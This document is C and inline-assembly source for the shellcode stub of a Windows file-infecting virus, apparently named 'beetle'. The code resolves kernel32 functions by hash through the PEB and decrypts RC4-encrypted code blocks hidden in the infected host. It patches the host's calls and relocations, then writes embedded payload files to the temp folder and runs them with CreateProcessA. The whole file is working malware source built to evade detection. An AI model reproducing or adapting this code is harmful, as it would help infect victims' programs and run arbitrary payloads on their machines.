#include <Windows.h>
#include <Winternl.h>
#include "loader.h"
#include "common.h"
#include "infect.h"
#include "morf.h"

void START_SHELL(){
	uint8 *b;
	_asm {
		mov b,ecx
	}

	uint32 x=delta();

	HMODULE k32=GetModuleHandle(KERNEL32);
	_tVirtualProtect _VirtualProtect=(_tVirtualProtect)GetGetProcAddress(k32,_hVirtualProtect);
	_tCreateThread _CreateThread=(_tCreateThread)GetGetProcAddress(k32,_hCreateThread);
	_tGetModuleHandleA _GetModuleHandleA=(_tGetModuleHandleA)GetGetProcAddress(k32,_hGetModuleHandleA);
	
	//!!!!! search infected image
	
	IMAGE_FILE_HEADER *ifh=(IMAGE_FILE_HEADER *)(b+*(uint32*)&b[0x3c]+4);
	IMAGE_OPTIONAL_HEADER *ioh=(IMAGE_OPTIONAL_HEADER*)(ifh+1);
	DWORD vp;

	//init shell block
	SHELL_BLOCK *sb=(SHELL_BLOCK *)((uint8*)START_SHELL+SIZE_SHELL+x-sizeof(SHELL_BLOCK));
	DECRYPT_ITEM *item=(DECRYPT_ITEM *)(sb+1);
	uint32 l=sb->rva;

	//decrypt function block
	_memcpy((uint8*)item,b+l,sizeof(DECRYPT_ITEM));
	crypt((uint8*)item,sizeof(DECRYPT_ITEM),sb->key,_CIP_RC4);
	l+=sizeof(DECRYPT_ITEM);

	//decrypt grab function
	_memcpy((uint8*)(item+1),b+l,item->size);
	crypt((uint8*)(item+1),item->size,item->key,_CIP_RC4);
	l+=item->size;

	//decrypt info grab function
	_memcpy((uint8*)((uint8*)(item+1)+item->size),b+l,sizeof(ITEM_CALL));
	crypt((uint8*)((uint8*)(item+1)+item->size),sizeof(ITEM_CALL),item->key,_CIP_RC4);
	l+=sizeof(ITEM_CALL);

	//restore grab function
	ITEM_CALL *grab=(ITEM_CALL *)((uint8*)(item+1)+item->size);

	_VirtualProtect(b+grab->rva_in,grab->len_func,PAGE_EXECUTE_READWRITE,&vp);
	_memcpy((uint8*)b+grab->rva_in,(uint8*)(item+1),grab->len_func);
	
	item=(DECRYPT_ITEM *)((uint8*)(item+1)+item->size+sizeof(ITEM_CALL));
	_memcpy((uint8*)item,b+l,sizeof(DECRYPT_ITEM));
	crypt((uint8*)item,sizeof(DECRYPT_ITEM),sb->key,_CIP_RC4);
	l+=sizeof(DECRYPT_ITEM);
	_memcpy((uint8*)(item+1),b+l,item->size);
	crypt((uint8*)(item+1),item->size,item->key,_CIP_RC4);
	l+=item->size;
	_memcpy((uint8*)((uint8*)(item+1)+item->size),b+l,4);
	crypt((uint8*)((uint8*)(item+1)+item->size),4,item->key,_CIP_RC4);
	l+=4;
	LIST_CALL lc;
	lc.count=*(uint32*)((uint8*)(item+1)+item->size);
	lc.list=(ITEM_CALL*)(item+1);
	//restore list call
	int j=0;
	for (int i=0;i<lc.count-1;i++){
		_VirtualProtect(b+lc.list[i].rva+1,4,PAGE_EXECUTE_READWRITE,&vp);
		*(uint32*)(b+lc.list[i].rva+1)=lc.list[i].rva_in-(5+lc.list[i].rva);
	}
	item=(DECRYPT_ITEM *)((uint8*)(item+1)+item->size+4);
	//restore relocation
	//---------
	_memcpy((uint8*)item,b+l,sizeof(DECRYPT_ITEM));
	crypt((uint8*)item,sizeof(DECRYPT_ITEM),sb->key,_CIP_RC4);
	l+=sizeof(DECRYPT_ITEM);
	uint32 n=item->size/4;
	_memcpy((uint8*)(item+1),b+l,item->size);
	crypt((uint8*)(item+1),item->size,item->key,_CIP_RC4);
	l+=item->size;
	uint32 *reloc=(uint32 *)(item+1);
	uint32 delta=(uint32)b-ioh->ImageBase;
	for (int i=0;i<n;i++){
		*((uint32 *)(b+reloc[i]))+=delta;
	}
	item=(DECRYPT_ITEM *)((uint8*)(item+1)+item->size);
	//----------
	//decrypt drop file
	DECRYPT_ITEM *u=(DECRYPT_ITEM *)item;

	while(1){
		_memcpy((uint8*)item,b+l,sizeof(DECRYPT_ITEM));
		crypt((uint8*)item,sizeof(DECRYPT_ITEM),sb->key,_CIP_RC4);
		l+=sizeof(DECRYPT_ITEM);
		if (item->key==0 || item->size==0) break;
		_memcpy((uint8*)(item+1),b+l,item->size);
		crypt((uint8*)(item+1),item->size,item->key,_CIP_RC4);
		l+=item->size;
		item=(DECRYPT_ITEM *)((uint8*)(item+1)+item->size);
	}

	_CreateThread(0,0,(LPTHREAD_START_ROUTINE)((uint8*)thread_main+x),u,0,0);

	_asm{
		leave //my local var
		add esp,4 //ret
		popad //restore reg
		leave //restore stack
		mov eax,[esp] //get addr return 
		add esp,4 //ret
		sub eax,5 //start call
		jmp eax //jmp -> call xxxxxxxx
	}
}

uint8 *get_base(uint8* base){
	uint32 p=(uint32)base&0xFFFFF000;
	while(1){
		if (*(uint16*)p=='ZM'){
			if (*(uint16*)(p+*(uint32*)(p+0x3c))=='EP'){
				break;
			}
		}
		p-=0x1000;
	}
	return (uint8*)p;
}

DWORD _stdcall thread_main(LPVOID arg){
	DECRYPT_ITEM *item=(DECRYPT_ITEM *)arg;
	uint32 x=delta();

	HMODULE k32=GetModuleHandle(KERNEL32);
	_tLoadLibraryA _LoadLibraryA=(_tLoadLibraryA)GetGetProcAddress(k32,_hLoadLibraryA);
	_tVirtualProtect _VirtualProtect=(_tVirtualProtect)GetGetProcAddress(k32,_hVirtualProtect);
	_tVirtualAlloc _VirtualAlloc=(_tVirtualAlloc)GetGetProcAddress(k32,_hVirtualAlloc);
	_tVirtualFree _VirtualFree=(_tVirtualFree)GetGetProcAddress(k32,_hVirtualFree);
	_tCreateThread _CreateThread=(_tCreateThread)GetGetProcAddress(k32,_hCreateThread);
	_tCreateMutexA _CreateMutexA=(_tCreateMutexA)GetGetProcAddress(k32,_hCreateMutexA);
	_tOpenMutexA _OpenMutexA=(_tOpenMutexA)GetGetProcAddress(k32,_hOpenMutexA);
	_tExitProcess _ExitProcess=(_tExitProcess)GetGetProcAddress(k32,_hExitProcess);
	_tGetProcAddress _GetProcAddress=(_tGetProcAddress)GetGetProcAddress(k32,_hGetProcAddress);
	_tCreateFileA _CreateFileA=(_tCreateFileA)GetGetProcAddress(k32,_hCreateFileA);
	_tWriteFile _WriteFile=(_tWriteFile)GetGetProcAddress(k32,_hWriteFile);
	_tCloseHandle _CloseHandle=(_tCloseHandle)GetGetProcAddress(k32,_hCloseHandle);
	_tCreateProcessA _CreateProcessA=(_tCreateProcessA)GetGetProcAddress(k32,_hCreateProcessA);
	_tSetFilePointer _SetFilePointer=(_tSetFilePointer)GetGetProcAddress(k32,_hSetFilePointer);
	_tGetModuleHandleA _GetModuleHandleA=(_tGetModuleHandleA)GetGetProcAddress(k32,_hGetModuleHandleA);
	_tGetTempPathA _GetTempPathA=(_tGetTempPathA)GetGetProcAddress(k32,_hGetTempPathA);
	_tGetTempFileNameA _GetTempFileNameA=(_tGetTempFileNameA)GetGetProcAddress(k32,_hGetTempFileNameA);

	char s_u32[]={'U','S','E','R','3','2','.','D','L','L',0};
	HMODULE u32=_LoadLibraryA(s_u32);
	_tMessageBoxA _MessageBoxA =(_tMessageBoxA)GetGetProcAddress(u32,_hMessageBoxA);
	
	uint8 *b=(uint8*)_GetModuleHandleA(0);
	
	char title[]={'H','e','l','l','o','!','!','?',0};
	char msg[]={'I','\'','m',' ','b','e','e','t','l','e',0};
	_MessageBoxA(0,msg,title,0);

	char tmp[MAX_PATH];
	while(item->key && item->size){
		_GetTempPathA(MAX_PATH,tmp);
		_GetTempFileNameA(tmp,0,0,tmp);
		HANDLE hf=_CreateFileA(tmp,GENERIC_WRITE,0,0,CREATE_ALWAYS,0,0);
		if (hf!=INVALID_HANDLE_VALUE){
			DWORD rw;
			bool r=_WriteFile(hf,(item+1),item->size,&rw,0);
			_CloseHandle(hf);
			if (r){
				STARTUPINFOA si;
				PROCESS_INFORMATION pi;
				_memset((uint8*)&si,0,sizeof(STARTUPINFOA));
				si.cb=sizeof(STARTUPINFOA);
				_CreateProcessA(0,tmp,0,0,FALSE,0,0,0,&si,&pi);
			}
		}
		item=(DECRYPT_ITEM*)((uint8*)(item+1)+item->size);
	}
	return 0;
}

void _memcpy(uint8 *m1,uint8 *m2,int size){
	for (int i=0;i<size;i++){
		m1[i]=m2[i];
	}
}

void _memset(uint8 *m1,uint8 ch,int size){
	for (int i=0;i<size;i++){
		m1[i]=ch;
	}
}

void _stdcall rc4_setup( rc4_context *ctx, const unsigned char *key, unsigned int keylen )
{
    int i, j, a;
    unsigned int k;
    unsigned char *m;

    ctx->x = 0;
    ctx->y = 0;
    m = ctx->m;

    for( i = 0; i < 256; i++ )
        m[i] = (unsigned char) i;

    j = k = 0;

    for( i = 0; i < 256; i++, k++ )
    {
        if( k >= keylen ) k = 0;

        a = m[i];
        j = ( j + a + key[k] ) & 0xFF;
        m[i] = m[j];
        m[j] = (unsigned char) a;
    }
}

int _stdcall rc4_crypt( rc4_context *ctx, size_t length, const unsigned char *input,
                unsigned char *output )
{
    int x, y, a, b;
    size_t i;
    unsigned char *m;

    x = ctx->x;
    y = ctx->y;
    m = ctx->m;

    for( i = 0; i < length; i++ )
    {
        x = ( x + 1 ) & 0xFF; a = m[x];
        y = ( y + a ) & 0xFF; b = m[y];

        m[x] = (unsigned char) b;
        m[y] = (unsigned char) a;

        output[i] = (unsigned char)
            ( input[i] ^ m[(unsigned char)( a + b )] );
    }

    ctx->x = x;
    ctx->y = y;

    return( 0 );
}


void crypt(uint8* d,int size,uint32 key,uint8 type){
	int n=size/4;
	uint32 *p=(uint32*)d;
	if(type==_CIP_XOR){
		for (int i=0;i<n;i++){
			p[i]^=key;
		}
	}

	if (type==_CIP_ADD){
		for (int i=0;i<n;i++){
			p[i]+=key;
		}
	}


	if (type==_CIP_SUB){
		for (int i=0;i<n;i++){
			p[i]-=key;
		}
	}

	if (type==_CIP_TRASH){
		uint32 k=key;
		for (int i=0;i<n;i++){
			p[i]^=k;
			k+=key;
		}
	}

	if (type==_CIP_RC4){
		rc4_context ctx;
		rc4_setup(&ctx,(uint8*)&key,4);
		rc4_crypt(&ctx,size,d,d);
	}
}


uint32 calc_hash(char *name)
{
	DWORD hash=0,tmp=0;
	while(*name){
		tmp=((tmp & 0xFFFFFF00) | *name);
		tmp=(tmp>>7) | (tmp<<(32-7));
		hash^=tmp;
		name++;
	}
	return hash;
}

char *upcase(char *name){
	char *p=name;
	while(*p){
		if (*p>='a') *p-=0x20;
		p++;
	}
	return name;
}

short *upcase_w(short *name){
	short *p=name;
	while(*p){
		if (*p>='a') *p-=0x20;
		p++;
	}
	return name;
}

uint32 calc_hash_w(short *name)
{
	DWORD hash=0,tmp=0;
	while(*name)
	{
		tmp=((tmp & 0xFFFFFF00) | *name);
		tmp=(tmp>>7) | (tmp<<(32-7));
		hash^=tmp;
		name++;
	}
	return hash;
}


uint32 calc_hash_upcase_w(short *name)
{
	DWORD hash=0,tmp=0;
	uint16 l;
	while(*name)
	{
		l=*name;
		if (l>='a') l-=0x20;
		tmp=((tmp & 0xFFFFFF00) | l);
		tmp=(tmp>>7) | (tmp<<(32-7));
		hash^=tmp;
		name++;
	}
	return hash;
}


LPVOID GetGetProcAddress(HMODULE Base,uint32 dwHashName){
	HMODULE hModule=Base;
	DWORD i=0;
	IMAGE_DOS_HEADER *imDh=(IMAGE_DOS_HEADER*)hModule;
	IMAGE_OPTIONAL_HEADER *imOh=(IMAGE_OPTIONAL_HEADER*)((DWORD)hModule+imDh->e_lfanew+4+
		sizeof(IMAGE_FILE_HEADER));
	IMAGE_EXPORT_DIRECTORY *imEd=(IMAGE_EXPORT_DIRECTORY*)RVATOVA(hModule,
		imOh->DataDirectory[0].VirtualAddress);
	DWORD *pAddrOfNames=(DWORD*)RVATOVA(hModule,imEd->AddressOfNames);
	WORD  *pAddrOfNameOrdinals=(WORD*)RVATOVA(hModule,imEd->AddressOfNameOrdinals);
	DWORD ordinal=0;
	if (HIWORD((DWORD)dwHashName) == 0)
	{		
		ordinal=(LOWORD((DWORD)dwHashName))-imEd->Base;
	}
	else
	{
		for(;i<imEd->NumberOfNames;i++,pAddrOfNames++,pAddrOfNameOrdinals++)
		{
			//сравниваем по хешам
			if(calc_hash((char*)RVATOVA(hModule,*pAddrOfNames))==dwHashName)
			{
				ordinal=*pAddrOfNameOrdinals;
				break;
			}
		}
	}
	DWORD *pAddrOfFunc=(DWORD*)RVATOVA(hModule,imEd->AddressOfFunctions);
	DWORD ret=pAddrOfFunc[ordinal];
	return (LPVOID)RVATOVA(hModule,ret);
}

uint32 delta(){
	uint32 a;
	__asm
	{
		call	_delta_
_delta_:
		pop		eax
		sub		eax,offset _delta_
		mov [a],eax
	}
	return a;
}

PPEB get_peb(){
	PPEB p;
	_asm{
		mov eax,fs:[0x30]
		mov [p],eax
	}
	return p;
}

HMODULE GetModuleHandle(uint32 hash)
{
	HMODULE base=0;
	PPEB peb = get_peb();
	LDR_DATA_TABLE_ENTRY *ldte=(LDR_DATA_TABLE_ENTRY *)peb->Ldr->InMemoryOrderModuleList.Flink;
	LIST_ENTRY *pstart=peb->Ldr->InMemoryOrderModuleList.Flink;
	LIST_ENTRY *p=peb->Ldr->InMemoryOrderModuleList.Flink;
	do{
		LDR_DATA_TABLE_ENTRY *l=(LDR_DATA_TABLE_ENTRY *)p;
		if (l->DllBase && l->FullDllName.Buffer){
			if (calc_hash_upcase_w((short*)l->FullDllName.Buffer)==hash){
				base=(HMODULE)l->Reserved2[0];
				break;
			}
		}
		p=p->Flink;
	}while(p!=pstart);

	return base;
}

NAKED void END_SHELL(){
//key
	_asm nop
	_asm nop
	_asm nop
	_asm nop
//rva
	_asm nop
	_asm nop
	_asm nop
	_asm nop
/*
//size
	_asm nop
	_asm nop
	_asm nop
	_asm nop
*/
}